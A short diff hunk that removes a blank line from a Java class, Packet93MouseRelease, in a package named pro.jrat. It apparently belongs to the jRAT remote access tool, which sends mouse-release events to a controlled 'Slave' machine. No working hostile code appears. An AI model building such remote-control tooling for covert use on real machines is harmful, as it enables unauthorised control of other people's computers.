@@ -4,7 +4,6 @@ import java.io.DataOutputStream;
 
 import pro.jrat.Slave;
 
-
 public class Packet93MouseRelease extends AbstractOutgoingPacket {
 
 	private int x;
